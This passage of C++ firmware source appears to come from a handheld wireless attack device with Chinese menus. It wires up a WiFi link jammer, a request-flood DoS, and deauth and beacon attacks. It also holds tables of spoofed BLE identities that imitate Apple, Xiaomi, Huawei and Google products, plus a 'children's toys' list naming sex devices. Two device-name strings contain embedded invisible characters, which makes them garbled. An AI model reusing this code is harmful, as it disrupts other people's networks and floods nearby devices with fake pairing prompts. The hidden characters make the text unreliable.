        if (!startWebTest()) {
          showModalMessage("启动失败，请重试");
        }
      }
    }
  }
}

void homeActionConnInterfere() {
  // 连接干扰
  if (SelectedVector.empty()) { 
    showModalMessage("请先选择AP/SSID"); 
    return; 
  }
  // 显示连接干扰说明页面
  if (showLinkJammerInfoPage()) {
    stabilizeButtonState();
    // 多选目标时显示确认弹窗
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("建议只选择一个目标", "《 返回", "继续 》")) {
        LinkJammer();
      }
    } else {
      if (showConfirmModal("启动连接干扰")) {
        LinkJammer();
      }
    }
  }
}

void homeActionApFlood() {
  // 请求发送（认证/关联请求泛洪 / AP洪水攻击）
  if (SelectedVector.empty()) { 
    showModalMessage("请先选择AP/SSID"); 
    return; 
  }
  // 先显示AP洪水攻击说明页面；确认则继续，返回则回到主菜单
  if (showApFloodInfoPage()) {
    // 稳定按键状态，为确认弹窗做准备
    stabilizeButtonState();
    // 多选目标时显示确认弹窗
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("建议只选择一个目标", "《 返回", "继续 》")) {
        RequestFlood();
      }
    } else {
      if (showConfirmModal("启动Dos攻击")) {
        RequestFlood();
      }
    }
  }
}

void homeActionAttackDetect() {
  // 攻击检测页面入口
  // 稳定按键状态，为确认弹窗做准备
  stabilizeButtonState();
  if (showConfirmModal("启动攻击帧检测")) {
    drawAttackDetectPage();
  }
}

void homeActionPacketMonitor() {
  // 数据包侦测页面入口
  // 稳定按键状态，为确认弹窗做准备
  stabilizeButtonState();
  if (showConfirmModal("启动数据包监视")) {
    checkBleResourcesForWiFi(); // 检查并清理BLE资源
    drawPacketDetectPage();
  }
}

void homeActionDeepScan() {
  // 稳定按键状态，为确认弹窗做准备
  stabilizeButtonState();
  if (showConfirmModal("启动深度扫描")) {
    checkBleResourcesForWiFi(); // 检查并清理BLE资源
    drawDeepScan();
  }
}

void homeActionWebUI() {
  // 稳定按键状态，为确认弹窗做准备
  stabilizeButtonState();
  if (showConfirmModal("启动Web UI")) {
    startWebUI();
  }
}

// ===== BLE helpers and actions =====
static bool ensureBleSafeToStart() {
  extern bool hs_sniffer_running;
  if (web_ui_active || web_test_active || hs_sniffer_running || deauthAttackRunning || beaconAttackRunning) {
    showModalMessage("请先停止WiFi/Web功能", "避免与蓝牙冲突");
    return false;
  }
  return true;
}

// ===== BLE Beacon Device Categories =====

// 定义缺失的 GAP_GATT_APPEARANCE 常量
#ifndef GAP_GATT_APPEARANCE_PHONE
#define GAP_GATT_APPEARANCE_PHONE 64
#endif
#ifndef GAP_GATT_APPEARANCE_WATCH
#define GAP_GATT_APPEARANCE_WATCH 192
#endif
#ifndef GAP_GATT_APPEARANCE_DISPLAY
#define GAP_GATT_APPEARANCE_DISPLAY 320
#endif
#ifndef GAP_GATT_APPEARANCE_HID_HEADSET
#define GAP_GATT_APPEARANCE_HID_HEADSET 896
#endif
#ifndef GAP_GATT_APPEARANCE_GENERIC_AUDIO
#define GAP_GATT_APPEARANCE_GENERIC_AUDIO 1024
#endif
#ifndef GAP_GATT_APPEARANCE_TABLET
#define GAP_GATT_APPEARANCE_TABLET 320
#endif
#ifndef GAP_GATT_APPEARANCE_GENERIC_COMPUTER
#define GAP_GATT_APPEARANCE_GENERIC_COMPUTER 128
#endif
#ifndef GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE
#define GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE 960
#endif
#ifndef GAP_GATT_APPEARANCE_VIDEO_DISPLAY
#define GAP_GATT_APPEARANCE_VIDEO_DISPLAY 320
#endif
#ifndef GAP_GATT_APPEARANCE_AUDIO_DEVICE
#define GAP_GATT_APPEARANCE_AUDIO_DEVICE 1024
#endif
#ifndef GAP_GATT_APPEARANCE_SENSOR
#define GAP_GATT_APPEARANCE_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_GENERIC_TAG
#define GAP_GATT_APPEARANCE_GENERIC_TAG 576
#endif
#ifndef GAP_GATT_APPEARANCE_HEART_RATE_SENSOR
#define GAP_GATT_APPEARANCE_HEART_RATE_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_BP_SENSOR
#define GAP_GATT_APPEARANCE_BP_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_GLUCOSE_METER
#define GAP_GATT_APPEARANCE_GLUCOSE_METER 832
#endif
#ifndef GAP_GATT_APPEARANCE_CYCLING_SENSOR
#define GAP_GATT_APPEARANCE_CYCLING_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR
#define GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_THERMOMETER
#define GAP_GATT_APPEARANCE_THERMOMETER 832
#endif
#ifndef GAP_GATT_APPEARANCE_BEACON
#define GAP_GATT_APPEARANCE_BEACON 576
#endif
#ifndef GAP_GATT_APPEARANCE_LIGHT_SENSOR
#define GAP_GATT_APPEARANCE_LIGHT_SENSOR 832
#endif
#ifndef GAP_GATT_APPEARANCE_ALARM_CLOCK
#define GAP_GATT_APPEARANCE_ALARM_CLOCK 832
#endif

// BLE Appearance constants for mixed category (values per spec provided)
#ifndef BLE_APPEARANCE_UNKNOWN
#define BLE_APPEARANCE_UNKNOWN 0
#endif
#ifndef BLE_APPEARANCE_GENERIC_PHONE
#define BLE_APPEARANCE_GENERIC_PHONE 64
#endif
#ifndef BLE_APPEARANCE_GENERIC_COMPUTER
#define BLE_APPEARANCE_GENERIC_COMPUTER 128
#endif
#ifndef BLE_APPEARANCE_GENERIC_WATCH
#define BLE_APPEARANCE_GENERIC_WATCH 192
#endif
#ifndef BLE_APPEARANCE_WATCH_SPORTS_WATCH
#define BLE_APPEARANCE_WATCH_SPORTS_WATCH 193
#endif
#ifndef BLE_APPEARANCE_GENERIC_CLOCK
#define BLE_APPEARANCE_GENERIC_CLOCK 256
#endif
#ifndef BLE_APPEARANCE_GENERIC_DISPLAY
#define BLE_APPEARANCE_GENERIC_DISPLAY 320
#endif
#ifndef BLE_APPEARANCE_GENERIC_REMOTE_CONTROL
#define BLE_APPEARANCE_GENERIC_REMOTE_CONTROL 384
#endif
#ifndef BLE_APPEARANCE_GENERIC_EYE_GLASSES
#define BLE_APPEARANCE_GENERIC_EYE_GLASSES 448
#endif
#ifndef BLE_APPEARANCE_GENERIC_TAG
#define BLE_APPEARANCE_GENERIC_TAG 512
#endif
#ifndef BLE_APPEARANCE_GENERIC_KEYRING
#define BLE_APPEARANCE_GENERIC_KEYRING 576
#endif
#ifndef BLE_APPEARANCE_GENERIC_MEDIA_PLAYER
#define BLE_APPEARANCE_GENERIC_MEDIA_PLAYER 640
#endif
#ifndef BLE_APPEARANCE_GENERIC_BARCODE_SCANNER
#define BLE_APPEARANCE_GENERIC_BARCODE_SCANNER 704
#endif
#ifndef BLE_APPEARANCE_GENERIC_THERMOMETER
#define BLE_APPEARANCE_GENERIC_THERMOMETER 768
#endif
#ifndef BLE_APPEARANCE_THERMOMETER_EAR
#define BLE_APPEARANCE_THERMOMETER_EAR 769
#endif
#ifndef BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR
#define BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR 832
#endif
#ifndef BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT
#define BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT 833
#endif
#ifndef BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE
#define BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE 896
#endif
#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_ARM
#define BLE_APPEARANCE_BLOOD_PRESSURE_ARM 897
#endif
#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_WRIST
#define BLE_APPEARANCE_BLOOD_PRESSURE_WRIST 898
#endif
#ifndef BLE_APPEARANCE_GENERIC_HID
#define BLE_APPEARANCE_GENERIC_HID 960
#endif
#ifndef BLE_APPEARANCE_HID_KEYBOARD
#define BLE_APPEARANCE_HID_KEYBOARD 961
#endif
#ifndef BLE_APPEARANCE_HID_MOUSE
#define BLE_APPEARANCE_HID_MOUSE 962
#endif
#ifndef BLE_APPEARANCE_HID_JOYSTICK
#define BLE_APPEARANCE_HID_JOYSTICK 963
#endif
#ifndef BLE_APPEARANCE_HID_GAMEPAD
#define BLE_APPEARANCE_HID_GAMEPAD 964
#endif
#ifndef BLE_APPEARANCE_HID_DIGITIZERSUBTYPE
#define BLE_APPEARANCE_HID_DIGITIZERSUBTYPE 965
#endif
#ifndef BLE_APPEARANCE_HID_CARD_READER
#define BLE_APPEARANCE_HID_CARD_READER 966
#endif
#ifndef BLE_APPEARANCE_HID_DIGITAL_PEN
#define BLE_APPEARANCE_HID_DIGITAL_PEN 967
#endif
#ifndef BLE_APPEARANCE_HID_BARCODE
#define BLE_APPEARANCE_HID_BARCODE 968
#endif
#ifndef BLE_APPEARANCE_GENERIC_GLUCOSE_METER
#define BLE_APPEARANCE_GENERIC_GLUCOSE_METER 1024
#endif
#ifndef BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR
#define BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR 1088
#endif
#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE
#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE 1089
#endif
#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE
#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE 1090
#endif
#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP
#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP 1091
#endif
#ifndef BLE_APPEARANCE_GENERIC_CYCLING
#define BLE_APPEARANCE_GENERIC_CYCLING 1152
#endif
#ifndef BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER
#define BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER 1153
#endif
#ifndef BLE_APPEARANCE_CYCLING_SPEED_SENSOR
#define BLE_APPEARANCE_CYCLING_SPEED_SENSOR 1154
#endif
#ifndef BLE_APPEARANCE_CYCLING_CADENCE_SENSOR
#define BLE_APPEARANCE_CYCLING_CADENCE_SENSOR 1155
#endif
#ifndef BLE_APPEARANCE_CYCLING_POWER_SENSOR
#define BLE_APPEARANCE_CYCLING_POWER_SENSOR 1156
#endif
#ifndef BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR
#define BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR 1157
#endif
#ifndef BLE_APPEARANCE_GENERIC_PULSE_OXIMETER
#define BLE_APPEARANCE_GENERIC_PULSE_OXIMETER 3136
#endif
#ifndef BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP
#define BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP 3137
#endif
#ifndef BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN
#define BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN 3138
#endif
#ifndef BLE_APPEARANCE_GENERIC_WEIGHT_SCALE
#define BLE_APPEARANCE_GENERIC_WEIGHT_SCALE 3200
#endif
#ifndef BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT
#define BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT 5184
#endif
#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP
#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP 5185
#endif
#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP
#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP 5186
#endif
#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD
#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD 5187
#endif
#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD
#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD 5188
#endif

#ifndef GAP_APPEARANCE_HID_KEYBOARD
#define GAP_APPEARANCE_HID_KEYBOARD 961
#endif
#ifndef GAP_GATT_APPEARANCE_HID_KEYBOARD
#define GAP_GATT_APPEARANCE_HID_KEYBOARD 961
#endif

// Additional Appearance subcategories used below
#ifndef GAP_APPEARANCE_HID_MOUSE
#define GAP_APPEARANCE_HID_MOUSE 962
#endif
#ifndef GAP_GATT_APPEARANCE_HID_MOUSE
#define GAP_GATT_APPEARANCE_HID_MOUSE 962
#endif

#ifndef GAP_APPEARANCE_HEADSET
#define GAP_APPEARANCE_HEADSET 1025
#endif
#ifndef GAP_GATT_APPEARANCE_HEADSET
#define GAP_GATT_APPEARANCE_HEADSET 1025
#endif

#ifndef GAP_APPEARANCE_HEADPHONES
#define GAP_APPEARANCE_HEADPHONES 1026
#endif
#ifndef GAP_GATT_APPEARANCE_HEADPHONES
#define GAP_GATT_APPEARANCE_HEADPHONES 1026
#endif

#ifndef GAP_APPEARANCE_EARBUD
#define GAP_APPEARANCE_EARBUD 1027
#endif
#ifndef GAP_GATT_APPEARANCE_EARBUD
#define GAP_GATT_APPEARANCE_EARBUD 1027
#endif

struct BleBeaconDevice {
  const char* name;
  uint16_t appearance;
  const char* service_uuid;
  uint16_t company_id;
};

// 苹果全家桶设备
static const BleBeaconDevice g_appleDevices[] = {
  {"iPhone 17 Pro Max",               GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x004C},
  {"iPad Pro",                        GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x004C},
  {"MacBook Pro",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x004C},
  {"AirPods 4 Pro",                   GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
  {"AirPods Max",                     GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
  {"Apple Watch Series 10",           GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x004C},
  {"Apple Vision Pro",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
  {"Apple TV 6 4K",                   GAP_GATT_APPEARANCE_VIDEO_DISPLAY,           "180F", 0x004C},
  {"HomePod mini",                    GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x004C},
  {"Apple 妙控键盘",                   GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
  {"Apple 妙控鼠󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标",                   GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
  {"Apple Pencil",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0x004C}
};
static const int g_appleDeviceCount = sizeof(g_appleDevices) / sizeof(g_appleDevices[0]);

// 小米全家桶设备
static const BleBeaconDevice g_xiaomiDevices[] = {
  {"Xiaomi 17 Pro Max",                GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
  {"Redmi Note 1󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠3",                    GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
  {"Redmi Book 14",                    GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x038F},
  {"Redmi Buds 6",                     GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
  {"小米手环 9 Pro",                    GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
  {"小米智能打印机",                    GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
  {"小米无线键盘",                      GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
  {"小米无线鼠标",                      GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
  {"小米智能签字笔",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0xFFFF},
  {"Xiaomi Watch S1",                  GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
  {"Xiaomi SU7 Ultra",                 GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
  {"Xiaomi Pad 7",                     GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
  {"Xiaomi Smart Speaker",             GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
  {"Xiaomi Smart Scale",               GAP_GATT_APPEARANCE_SENSOR,                  "180F", 0x038F}
};
static const int g_xiaomiDeviceCount = sizeof(g_xiaomiDevices) / sizeof(g_xiaomiDevices[0]);

// 儿童玩具设备
static const BleBeaconDevice g_toyDevices[] = {
  {"遥控按摩震动笔", BLE_APPEARANCE_HID_DIGITAL_PEN, "180F", 0xFFFF},
  {"按摩震动棒-A", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
  {"郊狼电击理疗仪", GAP_GATT_APPEARANCE_WATCH, "180F", 0x038F},
  {"按摩震动棒-B", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
  {"加热震动仙女棒", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
  {"按摩震动棒-C", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF}
};
static const int g_toyDeviceCount = sizeof(g_toyDevices) / sizeof(g_toyDevices[0]);

// 华为全家桶设备
static const BleBeaconDevice g_huaweiDevices[] = {
    {"HUAWEI Mate 70",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x027D},
    {"HUAWEI MatePad",              GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x027D},
    {"HUAWEI MateBook",             GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x027D},
    {"HUAWEI Earbuds",              GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
    {"HUAWEI Watch 4",              GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
    {"HUAWEI Watch GT 5",           GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
    {"Huawei AR Glasses",           GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x027D},
    {"Huawei Smart Box",            GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x027D},
    {"Huawei Speaker",              GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x027D},
    {"华为智能体重秤",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x027D}
};
static const int g_huaweiDeviceCount = sizeof(g_huaweiDevices) / sizeof(g_huaweiDevices[0]);

// Google全家桶设备
static const BleBeaconDevice g_googleDevices[] = {
    {"Google Pixel Fold",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x00E0},
    {"Google Pixel Tablet",            GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x00E0},
    {"Chromebook",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x00E0},
    {"Pixel Earbuds Buds",             GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
    {"Google Pixel Watch",             GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x00E0},
    {"Google Glass AR",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x00E0},
    {"Google TV",                      GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x00E0},
    {"Google Nest Speaker",            GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x00E0},
    {"Google Nest Door",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x00E0}
};
static const int g_googleDeviceCount = sizeof(g_googleDevices) / sizeof(g_googleDevices[0]);

// 全类型大杂烩（混合）
static const BleBeaconDevice g_mixedDevices[] = {
    {"[米家]智能眼镜",                     BLE_APPEARANCE_GENERIC_EYE_GLASSES,            "180F", 0xFFFF},
    {"[米家]运动手表",                     BLE_APPEARANCE_WATCH_SPORTS_WATCH,             "180F", 0xFFFF},
    {"[米家]智能手机",                     BLE_APPEARANCE_GENERIC_PHONE,                  "180F", 0xFFFF},
    {"[米家]平板电脑",                     BLE_APPEARANCE_GENERIC_COMPUTER,               "180F", 0xFFFF},
    {"[米家]遥控器",                       BLE_APPEARANCE_GENERIC_REMOTE_CONTROL,         "180F", 0xFFFF},
    {"[米家]标签",                         BLE_APPEARANCE_GENERIC_TAG,                    "180F", 0xFFFF},
    {"[米家]钥匙扣",                       BLE_APPEARANCE_GENERIC_KEYRING,                "180F", 0xFFFF},
    {"[米家]媒体播放器",                   BLE_APPEARANCE_GENERIC_MEDIA_PLAYER,           "180F", 0xFFFF},
    {"[米家]条码扫描枪",                   BLE_APPEARANCE_GENERIC_BARCODE_SCANNER,        "180F", 0xFFFF},
    {"[米家]体温计(耳温)",                 BLE_APPEARANCE_THERMOMETER_EAR,                "180F", 0xFFFF},
    {"[米家]心率带",                       BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT, "180F", 0xFFFF},
    {"[米家]血压计(上臂)",                 BLE_APPEARANCE_BLOOD_PRESSURE_ARM,             "180F", 0xFFFF},
    {"[米家]血压计(手腕)",                 BLE_APPEARANCE_BLOOD_PRESSURE_WRIST,           "180F", 0xFFFF},
    {"[米家]键盘",                         BLE_APPEARANCE_HID_KEYBOARD,                   "180F", 0xFFFF},
    {"[米家]鼠标",                         BLE_APPEARANCE_HID_MOUSE,                      "180F", 0xFFFF},
    {"[米家]游戏手柄",                     BLE_APPEARANCE_HID_GAMEPAD,                    "180F", 0xFFFF},
    {"[米家]操纵杆",                       BLE_APPEARANCE_HID_JOYSTICK,                   "180F", 0xFFFF},
    {"[米家]数位板",                       BLE_APPEARANCE_HID_DIGITIZERSUBTYPE,           "180F", 0xFFFF},
    {"[米家]读卡器",                       BLE_APPEARANCE_HID_CARD_READER,                "180F", 0xFFFF},
    {"[米家]数字笔",                       BLE_APPEARANCE_HID_DIGITAL_PEN,                "180F", 0xFFFF},
    {"[米家]条码扫描器(HID)",              BLE_APPEARANCE_HID_BARCODE,                    "180F", 0xFFFF},
    {"[米家]血糖仪",                       BLE_APPEARANCE_GENERIC_GLUCOSE_METER,          "180F", 0xFFFF},
    {"[米家]跑步传感器(鞋内)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE, "180F", 0xFFFF},
    {"[米家]跑步传感器(鞋上)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE, "180F", 0xFFFF},
    {"[米家]跑步传感器(腰部)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP,  "180F", 0xFFFF},
    {"[米家]骑行码表",                     BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER,       "180F", 0xFFFF},
    {"[米家]骑行速度传感器",               BLE_APPEARANCE_CYCLING_SPEED_SENSOR,           "180F", 0xFFFF},
    {"[米家]骑行踏频传感器",               BLE_APPEARANCE_CYCLING_CADENCE_SENSOR,         "180F", 0xFFFF},
    {"[米家]骑行功率计",                   BLE_APPEARANCE_CYCLING_POWER_SENSOR,           "180F", 0xFFFF},
    {"[米家]速度踏频一体",                 BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR,   "180F", 0xFFFF},
    {"[米家]血氧仪(指夹)",                 BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP,       "180F", 0xFFFF},
    {"[米家]血氧仪(腕戴)",                 BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN,      "180F", 0xFFFF},
    {"[米家]体重秤",                       BLE_APPEARANCE_GENERIC_WEIGHT_SCALE,           "180F", 0xFFFF},
    {"[米家]户外运动定位显示",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP,    "180F", 0xFFFF},
    {"[米家]户外运动定位+导航显示",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP, "180F", 0xFFFF},
    {"[米家]户外运动定位POD",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD,     "180F", 0xFFFF},
    {"[米家]户外运动定位+导航POD",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD,  "180F", 0xFFFF}
};
static const int g_mixedDeviceCount = sizeof(g_mixedDevices) / sizeof(g_mixedDevices[0]);

// 罕见设备整合
static const BleBeaconDevice g_miscDevices[] = {
    {"Heart Rate Monitor",             GAP_GATT_APPEARANCE_HEART_RATE_SENSOR,         "180F", 0xFFFF},
    {"Blood Pressure Monitor",         GAP_GATT_APPEARANCE_BP_SENSOR,                 "180F", 0xFFFF},
    {"Glucose Meter",                  GAP_GATT_APPEARANCE_GLUCOSE_METER,             "180F", 0xFFFF},
    {"Cycling Speed",                  GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
    {"Walking Sensor",                 GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR,    "180F", 0xFFFF},
    {"Indoor Bike Sensor",             GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
    {"外星科技体温计",                  GAP_GATT_APPEARANCE_THERMOMETER,                "180F", 0xFFFF},
    {"Generic Tag 智障标签",            GAP_GATT_APPEARANCE_GENERIC_TAG,               "180F", 0xFFFF},
    {"iBeacon",                        GAP_GATT_APPEARANCE_BEACON,                    "180F", 0xFFFF},
    {"智能光照传感器",                  GAP_GATT_APPEARANCE_LIGHT_SENSOR,              "180F", 0xFFFF},
    {"外星科技无线耳机",                GAP_APPEARANCE_HEADSET,                        "180F", 0x0942},
    {"高科技智能耳机",                  GAP_APPEARANCE_HEADPHONES,                     "180F", 0x0943 },
    {"Clock Device",                   GAP_GATT_APPEARANCE_ALARM_CLOCK,               "180F", 0xFFFF}
};
static const int g_miscDeviceCount = sizeof(g_miscDevices) / sizeof(g_miscDevices[0]);

// 设备类别枚举
enum BleDeviceCategory {
  BLE_CATEGORY_APPLE = 0,
  BLE_CATEGORY_XIAOMI = 1,
  BLE_CATEGORY_HUAWEI = 2,
  BLE_CATEGORY_GOOGLE = 3,
  BLE_CATEGORY_MIXED = 4,
  BLE_CATEGORY_MISC = 5,
  BLE_CATEGORY_TOY = 6
};

// ===== Generic BLE Menu System =====
typedef void (*BleMenuAction)();

struct BleMenuItem {
  const char* label;
  BleMenuAction action;
};

// 通用BLE菜单函数
void showGenericBleMenu(const char* title, const BleMenuItem* items, int itemCount);
static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex);
static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex);

// 前向声明
void bleBeaconDeviceMenu();
void bleBeaconBroadcast(BleDeviceCategory category);
void bleBeaconMixedAction();

// BLE信标设备类别回调函数
void bleBeaconAppleAction();
void bleBeaconXiaomiAction();
void bleBeaconToyAction();
void bleBeaconHuaweiAction();
void bleBeaconGoogleAction();
void bleBeaconMiscAction();

void homeActionBleTest() {
  if (!ensureBleSafeToStart()) return;
  stabilizeButtonState();
  bleBeaconDeviceMenu();
}

void homeActionBlePopupTest() {
  if (!ensureBleSafeToStart()) return;
  stabilizeButtonState();
  blePopupMenu();
}

// ===== BLE feature implementations (ported from backup) =====

// BLE popup rate control system
static int g_blePopupRateIndex = 2; // Default to 100ms (index 2)
static const int BLE_RATE_OPTIONS[] = {20, 50, 100, 200, 300, 400, 500}; // ms
static const int BLE_RATE_COUNT = sizeof(BLE_RATE_OPTIONS) / sizeof(BLE_RATE_OPTIONS[0]);

// BLE状态管理和资源冲突预防
static bool g_bleActiveAdvertising = false; // 跟踪BLE广播状态
static unsigned long g_lastBleActivity = 0; // 最后BLE活动时间
static bool g_bleResourcesInUse = false; // BLE资源使用标志

// Get current rate delay in ms
static int getBlePopupDelay() {
  return BLE_RATE_OPTIONS[g_blePopupRateIndex];
}

// 强化的BLE资源清理函数
static void performCompleteBleCleanup() {
  Serial.println("=== 开始强化BLE资源清理 ===");
  
  // 1. 标记BLE资源清理开始
  g_bleResourcesInUse = false;
  g_bleActiveAdvertising = false;
  
  // 2. 强制停止所有BLE广播
  if (BLE.configAdvert()) {
    Serial.println("停止BLE广播...");
    BLE.configAdvert()->stopAdv();
    delay(150); // 增加延时确保停止完成
  }
  
  // 3. 清理BLE连接和服务
  Serial.println("清理BLE连接和服务...");
  BLE.end(); // 清理所有BLE服务和连接
  delay(200);
  
  // 4. 完全去初始化BLE栈
  Serial.println("去初始化BLE栈...");
  BLE.deinit();
  delay(300); // 增加延时确保完全清理
  
  // 5. 重置硬件状态
  Serial.println("重置硬件状态...");
  delay(200);
  
  // 6. 记录清理完成时间
  g_lastBleActivity = millis();
  
  Serial.println("BLE资源清理完成");
}

// 检查是否可以安全启动WiFi功能
static bool canSafelyStartWiFi() {
  // 如果BLE资源仍在使用中，等待清理
  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
    Serial.println("等待BLE资源清理...");
    performCompleteBleCleanup();
    return false;
  }
  
  // 确保距离上次BLE活动有足够间隔
  unsigned long timeSinceLastBle = millis() - g_lastBleActivity;
  if (timeSinceLastBle < 1000) { // 至少等待1秒
    Serial.print("等待BLE资源稳定 (");
    Serial.print(1000 - timeSinceLastBle);
    Serial.println(" ms)...");
    delay(1000 - timeSinceLastBle);
  }
  
  return true;
}

// 安全检查BLE状态（实现）
static void checkBleResourcesForWiFi() {
  // 如果BLE正在使用，执行强化清理
  if (g_bleResourcesInUse || g_bleActiveAdvertising) {
    Serial.println("检测到BLE活动，执行强化清理...");
    performCompleteBleCleanup();
    delay(200); // 给WiFi硬件恢复时间
  }
}

